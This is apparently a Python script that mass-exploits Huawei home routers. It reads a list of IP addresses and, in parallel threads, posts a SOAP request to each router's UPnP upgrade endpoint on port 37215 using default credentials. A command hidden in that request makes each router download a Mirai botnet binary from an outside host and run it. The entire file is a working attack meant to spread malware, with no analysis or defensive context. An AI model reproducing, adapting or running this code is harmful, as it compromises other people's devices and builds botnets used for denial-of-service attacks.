#! python !#
import threading, sys, time, random, socket, re, os, struct, array, requests
from requests.auth import HTTPDigestAuth
ips = open(sys.argv[1], "r").readlines()
cmd = "/bin/busybox wget -g ghost.lspmodz.ml -l /tmp/.leet -r /bins/mirai.mips; chmod 777 /tmp/.leet; /tmp/.leet huawei"
rm = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$("+cmd+")>NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"


class exploit(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				url = "http://" + self.ip + ":37215/ctrlt/DeviceUpgrade_1"
				requests.post(url, timeout=5, auth=HTTPDigestAuth('dslf-config','admin'), data=rm)
				print "[HUAWEI] Loading " + self.ip
			except Exception as e:
				pass
for ip in ips:
	try:
		n = exploit(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass
